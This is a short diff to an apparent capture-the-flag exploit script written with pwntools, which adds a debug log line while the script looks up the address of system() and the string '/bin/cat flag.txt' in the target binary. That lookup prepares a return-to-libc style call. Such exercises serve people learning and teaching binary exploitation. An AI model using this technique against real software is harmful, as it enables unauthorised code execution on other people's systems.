@@ -24,8 +24,9 @@ def exploit(binary_path):
     # Automatically close the process when the "with" block is exited
     with process(elf.path) as io:
 
-        # Get the address of the system function
+        # Get the address of the system() function
         system_addr = elf.symbols["system"]
+        log.debug(f"The address of system() is {hex(system_addr)}")
 
         # Find the address of the "/bin/cat flag.txt" string
         string_addr = next(elf.search(b'/bin/cat flag.txt'))
